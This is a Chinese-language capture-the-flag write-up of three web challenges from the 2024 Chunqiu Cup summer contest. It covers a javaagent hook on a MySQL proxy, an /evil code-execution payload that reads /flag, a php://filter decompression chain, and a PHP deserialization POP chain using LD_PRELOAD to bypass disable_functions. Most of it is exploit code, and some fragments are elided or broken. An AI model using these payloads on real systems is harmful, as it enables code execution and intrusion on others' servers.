---
title: 2024 春秋杯夏季赛 WP(web)
contest: 2024 春秋杯网络安全联赛夏季赛
year: 2024
difficulty: medium
vuln_type: [rce, deserialize, ssti, web_unknown, xxe]
tags: [Java Proxy 代理 6666→3306, javaagent javassist hook, mysql_native_password, System cmd "/tmp/log.txt" base64 写日志, /evil 端点 code key 校验, php://filter zlib.inflate 多层解压, ENV/DIFF/FILE/FUN POP 链, LD_PRELOAD putenv system, syscall bypass disable_functions]
attack_chain:
  - Java Proxy: 6666→127.0.0.1:3306 透明转发
  - javaagent javassist: hook Proxy.send()，data 含 "def" 时改 base64 解密 payload
  - payload: 反编译 ELF 触发 mysql_native_password auth 字符串
  - /evil 端点接受 {"code": payload, "key": md5(secret)}，key=bb889ebe2ca32f6b188f07240e2204b9
  - code 用 exec("__import__('os').popen('cat /flag').read()")
  - payload2: hook socket.send 改路径 './1.tar.gz'
  - php://filter read=zlib.inflate|zlib.inflate|dechunk|convert.iconv.latin1.latin1+base64 解压 data:
  - ENV/DIFF/FILE/FUN 反序列化 POP 链
  - ENV.__toString → putenv + system("cat hints.txt")
  - DIFF.__isset → system("cat /flag") + callback->p 触发 FUN.__get
  - FILE.__call → file_put_contents 写文件 + rename
  - DIFF private $flag=true 需绕过
key_payload: "ENV.__toString: putenv(\"$key=$value\"); system(\"cat hints.txt\")"
one_liner: 春秋杯夏季赛 web 三题：Java 代理 javaagent hook MySQL 流量 + /evil 代码执行 + PHP 多层 php://filter 解压 data URI + ENV/DIFF/FILE/FUN 反序列化 LD_PRELOAD 绕 disable_functions。
lesson: Java Proxy 透明代理+javaagent hook 是 CTF 高级 web 套路：拿到 jar 注入 javassist 改 send 逻辑；ENV/DIFF/FILE/FUN 这套 POP 链核心是 ENV.__toString 调 putenv+system，FILE.__call 写文件配合 LD_PRELOAD 绕 disable_functions。
quality: high
---

# 2024 春秋杯夏季赛 WP(web)

## Web 1：Java Proxy + javaagent hook

Java 端：
```java
package com.ctf;
public class Proxy {
    public Proxy() {
        int sourcePort = 6666;
        String destinationHost = "127.0.0.1";
        short destinationPort = 3306;
        // ServerSocket 6666 → 127.0.0.1:3306
    }
    private void send(OutputStream o, byte[] data, int c) throws IOException {
        o.write(data, 0, c); o.flush();
    }
}
```
javaagent 端（javassist hook `send`）：
```java
public class ProxyTransformer implements ClassFileTransformer {
    public byte[] transform(...) {
        if (!className.startsWith("com/ctf/Proxy")) return classfileBuffer;
        ClassPool cp = ClassPool.getDefault();
        CtClass cc = cp.get("com.ctf.Proxy");
        CtMethod m = cc.getDeclaredMethod("send");
        m.insertBefore(
            "String strdata = new String($2);\n" +
            "if (strdata.contains(\"def\")) {\n" +
            "  $2 = java.util.Base64.getDecoder().decode(\"...\");\n" +  // mysql_native_password
            "  $3 = 25;\n" +
            "}\n" +
            // 写 base64(原始 data) 到 /tmp/log.txt
            "java.io.FileWriter fileWriter = new java.io.FileWriter(\"/tmp/log.txt\", true);\n" +
            "fileWriter.write(java.util.Base64.getEncoder().encodeToString($2));\n" +
            "fileWriter.write(\"\\n\");\n" +
        );
    }
}
```

**`/evil` 端点**：post `{"code": "import os; os.system('cat /flag')", "key": "bb889ebe2ca32f6b188f07240e2204b9"}`，执行任意 code。  
也可以 hook `socket.send` 改路径写文件：
```python
socket.socket.send = new_send
def new_send(self, data, *args, **kwargs):
    modified_data = '{"code":1, "path": "./1.tar.gz"}'.encode('utf-8')
    return original_send(self, modified_data, *args, **kwargs)
```

## Web 2：php://filter 多层解压 data URI

`php://filter/read=zlib.inflate|zlib.inflate|dechunk|convert.iconv.latin1.latin1|dechunk|.../resource=data:text/plain;base64,e3vXMO+...`  
多层 zlib inflate + dechunk + iconv 转码，从 data URI base64 解出 PHP 代码。

## Web 3：ENV/DIFF/FILE/FUN 反序列化 + LD_PRELOAD 绕 disable_functions

```php
class ENV {
    public $key; public $value; public $math;
    public function __toString() {
        $key = filter($this->key);
        $value = filter($this->value);
        putenv("$key=$value");
        system("cat hints.txt");
    }
    public function __wakeup() {
        if (isset($this->math->flag)) echo getenv("LD_PRELOAD");
        else echo "YesYesYes";
    }
}
class DIFF {
    public $callback; public $back; private $flag = true;
    public function __isset($arg1) {
        system("cat /flag");
        $this->callback->p;
        echo "...";
    }
}
class FILE {
    public $filename; public $enviroment;
    public function __call($function_name, $value) {
        // file_put_contents + rename 写到 /tmp/xxx.so
        if (preg_match('/.[^.]*$/', $this->filename, $matches)) {
            $uploadDir = "/tmp/";
            $destination = $uploadDir . md5(time()) . $matches[0];
            file_put_contents($this->filename, base64_decode($value[0]));
            rename($this->filename, $destination);
        }
    }
}
class FUN {
    public $fun; public $value;
    public function __get($name) { $this->fun->getflag($this->value); }
}
```

POP 链：
```php
$file = new FILE();
$file->filename = "1.php";
$fun = new FUN();
$fun->fun = $file;
$fun->value = base64_encode("<?php echo md5(1);?>");
$diff = new DIFF();
$diff->callback = $fun;
$env = new ENV();
$env->math = $diff;
$p = serialize($env);
$p = str_replace("\x00", "%00", $p);  // private 字段含 \x00
```
触发 `__wakeup` → `__isset` (`math->flag`) → `__get` (callback->p) → `__call` (fun->getflag) → FILE 写文件 → `__toString` → putenv LD_PRELOAD + system。
